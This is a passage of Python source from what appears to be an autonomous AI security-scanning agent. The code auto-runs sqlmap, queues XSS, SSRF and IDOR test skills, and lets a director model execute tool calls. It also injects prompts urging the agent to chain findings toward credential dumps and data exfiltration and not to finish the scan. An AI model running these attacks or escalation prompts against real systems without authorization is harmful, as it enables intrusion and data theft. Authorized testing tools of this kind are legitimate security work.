                                "name": "shell_exec",
                                "args": {"command": f"sqlmap -u '{target_url}' --batch"},
                                "result": {"ok": True, "summary": sr.summary, "data": sr.data},
                            })
                            # Parse sqlmap output for injectable params
                            is_injectable = any(
                                kw in stdout.lower()
                                for kw in ["is vulnerable", "injectable", "payload:", "type:"]
                            )
                            if is_injectable:
                                # Auto-report — don't ask Brain, it won't do it
                                await self._dispatch_report_finding_checked(self._build_report_finding_args(
                                    title=f"SQL Injection confirmed by sqlmap on {target_url.split('?')[0]}",
                                    severity="critical",
                                    finding_type="sql_injection",
                                    affected_component=target_url,
                                    description="sqlmap confirmed injectable behavior on the supplied parameterized URL.",
                                    impact="Attackers may extract or modify backend database data and pivot into account compromise or administrative access.",
                                    technical_analysis="The auto-sqlmap branch detected canonical sqlmap success markers including injectable parameter / payload output in the tool transcript.",
                                    poc_description="Run sqlmap against the same target URL and confirm that the tool identifies the parameter as injectable and returns working payload details.",
                                    poc_script_code=stdout[:4000],
                                    remediation_steps="Parameterize the backend query, remove raw SQL concatenation, and suppress database error leakage to clients.",
                                    endpoint=target_url,
                                    method="GET",
                                    cwe="CWE-89",
                                ))
                                self.state.add_message("user", (
                                    f"AUTO-EXPLOIT: sqlmap confirmed SQL injection on {target_url}!\n"
                                    "Finding auto-reported as CRITICAL sql_injection."
                                ))
                                logger.info("auto-sqlmap FOUND injection on %s", target_url)
                            else:
                                self.state.add_message("user", (
                                    f"AUTO-EXPLOIT: sqlmap ran on {target_url} but did not "
                                    f"confirm injection. Output:\n{stdout[:1000]}\n\n"
                                    "Try different endpoints or parameters."
                                ))
                            logger.info("auto-sqlmap completed at iter %d", self.state.iteration)
                    except Exception:
                        logger.exception("auto-sqlmap failed")

            # ── Chain Analysis Nudge (persistent re-injection) ─────────
            # Brain-First: we keep nudging until chains are built. The nudge
            # is re-injected every 6 iters while chain pressure exists, so it
            # never gets buried in history. Brain decides HOW to chain; we
            # just keep the pressure on.
            try:
                from vxis.agent.tools.finding_tools import _get_findings, _get_chains
                _nudge_findings = _get_findings()
                _nudge_chains = _get_chains()
                _last_nudge_iter = getattr(self, '_last_chain_nudge_iter', -100)
                _nudge_gap = self.state.iteration - _last_nudge_iter
                _desired = max(3, len(_nudge_findings) // 3)
                _needs_chain = (
                    len(_nudge_findings) >= 3
                    and len(_nudge_chains) < _desired
                    and self.state.iteration >= 18
                    and _nudge_gap >= 6
                )
                if _needs_chain:
                    self._last_chain_nudge_iter = self.state.iteration
                    # Build a findings summary for Brain to reason about
                    f_summary = "\n".join(
                        f"  {f['id']} [{f.get('severity','?').upper()}] {f.get('finding_type','')}: {f.get('title','')[:60]}"
                        for f in _nudge_findings[:15]
                    )
                    # Concrete example pair from actual findings
                    _fid_a = _nudge_findings[0]["id"]
                    _fid_b = _nudge_findings[-1]["id"] if len(_nudge_findings) > 1 else _nudge_findings[0]["id"]
                    existing_str = ""
                    if _nudge_chains:
                        existing_str = (
                            f"\nYou already built {len(_nudge_chains)} chain(s):\n"
                            + "\n".join(
                                f"  {c.get('id')}: {' → '.join(c.get('finding_ids', []))}"
                                for c in _nudge_chains[:5]
                            )
                            + f"\n\nBuild {_desired - len(_nudge_chains)} MORE. Every combination.\n"
                        )
                    self.state.add_message("user", (
                        "═══ CHAIN ANALYSIS PHASE — DO NOT finish_scan ═══\n\n"
                        f"Findings: {len(_nudge_findings)} | Chains: {len(_nudge_chains)} / {_desired} target\n\n"
                        f"YOUR FINDINGS:\n{f_summary}\n"
                        f"{existing_str}\n"
                        "A chain = one finding's output feeds into the next exploit.\n"
                        "Example: SQLi dumps admin creds → log in → access admin panel → "
                        "find IDOR → exfiltrate all user data.\n\n"
                        "CONCRETE ACTION you can take RIGHT NOW:\n"
                        f'  link_chain(finding_ids=["{_fid_a}", "{_fid_b}"], '
                        f'rationale="<why these compose>", '
                        f'crown_jewel="<admin takeover | DB dump | RCE | data exfil>")\n\n'
                        "For EACH chain:\n"
                        "  1. TRY IT — use tools to prove the chain works.\n"
                        "  2. Call link_chain with the finding IDs + rationale + crown jewel.\n"
                        "  3. Move to the next combination.\n\n"
                        "Think creatively. Combine findings in every way you can imagine. "
                        "The more chains you build, the better the report."
                    ))
                    logger.info(
                        "chain nudge re-injected at iter %d (%d findings, %d chains, target %d)",
                        self.state.iteration, len(_nudge_findings),
                        len(_nudge_chains), _desired,
                    )
            except Exception:
                logger.exception("chain nudge failed")

            # ── Skill sweep: force untried skills ──────────────────────
            # Without this, skills that require URL-with-params (test_xss,
            # test_ssrf), a token (test_auth_deep), or an id_pattern
            # (test_idor) can go completely unattempted when enumerate
            # doesn't find suitable endpoints or auth doesn't succeed.
            # Result: vector_coverage caps low.
            #
            # At iter ≥ 25 and every 10 iters thereafter, queue every
            # untried registry skill with a generic default. Brain still
            # sees each result and decides how to escalate.
            try:
                if self.state.iteration >= 25 and "run_skill" in self.registry.list_tools():
                    _last_sweep = getattr(self, '_last_skill_sweep_iter', -100)
                    _sweep_gap = self.state.iteration - _last_sweep
                    if _sweep_gap >= 10:
                        from vxis.agent.skills import SKILL_REGISTRY as _REG
                        # Filter the registry to skills that match the surface
                        # kind. The 6 desktop skills (module-level _DESKTOP_SKILLS)
                        # have macOS-specific code paths (codesign, otool, plistlib)
                        # that crash or return empty on web targets. Conversely,
                        # web skills on a desktop target waste iters firing HTTP
                        # at a file:// path.
                        _all_registered = set(_REG.keys())
                        if self._target_kind == _TK.DESKTOP:
                            _eligible = _all_registered & _DESKTOP_SKILLS
                        else:
                            _eligible = _all_registered - _DESKTOP_SKILLS
                        _untried = sorted(
                            sk for sk in (_eligible - _real_skills_completed)
                            if self._recent_blocked_skill_count(sk) < 3
                        )
                        if _untried:
                            self._last_skill_sweep_iter = self.state.iteration
                            _base = self.state.target.rstrip("/")
                            # Best-guess defaults for skills that need more
                            # than target_url. Pick params generic enough to
                            # at least exercise the skill path — Brain will
                            # re-run with better args once it sees results.
                            _defaults: dict[str, dict] = {
                                "test_injection": {"url": f"{_base}/search?q=test"},
                                "test_xss": {"url": f"{_base}/search?q=test"},
                                "test_ssrf": {"url": f"{_base}/redirect?url=http://example.com"},
                                "test_idor": {"url_pattern": f"{_base}/api/users/{{id}}", "token": _auth_token or "", "max_id": 30 if _auth_token else 20},
                                "post_auth_enum": {"token": _auth_token or ""},
                                "test_auth_deep": {"token": _auth_token},
                                "test_csrf": {"token": _auth_token},
                                "test_api_security": {"token": _auth_token},
                                "test_business_logic": {"token": _auth_token},
                            }
                            _queued = 0
                            for sk in _untried:
                                params = dict(_defaults.get(sk, {}))
                                params["_skill_override"] = sk
                                _alias = f"{sk}__sweep{self.state.iteration}"
                                if _queue_skill(sk, self.state.iteration + 1, params, alias=_alias):
                                    _queued += 1
                            self.state.add_message("user", (
                                f"SKILL SWEEP at iter {self.state.iteration}: "
                                f"{_queued} untried skills queued ({', '.join(_untried[:8])}"
                                f"{'...' if len(_untried) > 8 else ''}). "
                                "Vector coverage was dropping — these will run on upcoming iters "
                                "with generic defaults. Watch the results and refine with targeted "
                                "args if any look promising."
                            ))
                            logger.info(
                                "skill sweep iter %d: queued %d untried: %s",
                                self.state.iteration, _queued, _untried,
                            )
            except Exception:
                logger.exception("skill sweep failed")

            # Strategic Director: every N iterations, a stronger model (gpt-5.4)
            # decides the EXACT next tool call and the scan loop executes it
            # directly. This is the hybrid brain pattern — strong model for
            # strategy, weak model for routine.
            if (
                not self.state.completed
                and self.critic_interval > 0
                and self.state.iteration - self._last_critic_iter >= self.critic_interval
                and self.state.iteration < self.state.max_iters - 2
            ):
                self._last_critic_iter = self.state.iteration
                try:
                    director_action = await self._director_decide()
                except Exception:
                    logger.exception("director_decide raised")
                    director_action = None
                if director_action:
                    d_name, d_args = director_action
                    # Dedup: don't let director repeat the same call
                    try:
                        d_key = f"{d_name}::{_json.dumps(d_args, sort_keys=True, default=str)}"
                    except Exception:
                        d_key = f"{d_name}::{d_args!r}"
                    d_count = _call_counts.get(d_key, 0)
                    if d_count >= 3:
                        logger.warning("iter %d: director dedup-blocked %s", self.state.iteration, d_name)
                    else:
                        _call_counts[d_key] = d_count + 1
                        try:
                            self._emit_action_progress(d_name, d_args, "Director executing")
                            d_result = await self.registry.dispatch(d_name, d_args)
                            self.state.add_message("tool", {
                                "name": d_name,
                                "args": d_args,
                                "result": {
                                    "ok": d_result.ok,
                                    "summary": f"[DIRECTOR] {d_result.summary}",
                                    "data": d_result.data,
                                },
                            })
                            logger.info(
                                "iter %d: director executed %s → %s",
                                self.state.iteration, d_name,
                                "ok" if d_result.ok else "fail",
                            )
                            # Auto-analyze director results for findings
                            if d_result.ok and d_name in ("http_request", "shell_exec", "python_exec"):
                                data = d_result.data or {}
                                stdout = str(data.get("stdout", data.get("body", "")))[:2000]
                                status = data.get("status_code", data.get("exit_code", 0))
                                if stdout and (
                                    "vulnerable" in stdout.lower()
                                    or "injectable" in stdout.lower()
                                    or "payload:" in stdout.lower()
                                    or (isinstance(status, int) and status == 500)
                                ):
                                    self.state.add_message("user", (
                                        f"DIRECTOR RESULT ANALYSIS: {d_name} on "
                                        f"{d_args.get('url', d_args.get('command',''))[:80]} "
                                        f"returned interesting data (status={status}). "
                                        f"Output: {stdout[:500]}\n"
                                        "If this is a real vulnerability, call report_finding."
                                    ))
                        except Exception:
                            logger.exception("director action dispatch failed")
        self._maybe_finalize_budget_exhausted_scan()
        self.state.clear_waiting_reason()
        self._emit_control_plane("Scan loop completed")
        return {
            "target": self.state.target,
            "completed": self.state.completed,
            "iterations": self.state.iteration,
            "findings": self.state.findings,
            "messages": len(self.state.messages),
            "peak_context_bytes": self.state.peak_context_bytes,
            "verdict_counts": dict(self.state.verdict_counts),
            "confirmed_findings": list(self.state.confirmed_findings),
            "refuted_findings": list(self.state.refuted_findings),
            # Phase Q10: return _real_skills_completed so the pipeline's
            # _DESKTOP_SKILL_TO_VECTORS lookup matches. _skills_completed
            # contains queue aliases the iter-25 sweep injects (e.g.
            # 'test_dylib_hijack__sweep25'), which never match the mapping
            # keys (real names) → VC=0. _real_skills_completed already
            # holds the un-aliased real names for both sweep and Brain-direct
            # paths.
            "skills_completed": list(_real_skills_completed),
            "sandbox_invocations": list(_sandbox_invocations),
            "vector_candidates": self.state.vector_candidates_as_dicts(),
            "attempt_outcomes": self.state.attempt_outcomes_as_dicts(),
            "scan_todos": self.state.scan_todos_as_dicts(),
            "branches": self.state.branches_as_dicts(),
            "review_queue": self.state.review_queue_as_dicts(),
            "review_history": self.state.review_history_as_dicts(),
            "callback_observations": self.state.callback_observations_as_dicts(),
            "retrieval_observations": self.state.retrieval_observations_as_dicts(),
            "shared_notes": list(self.state.shared_notes),
        }
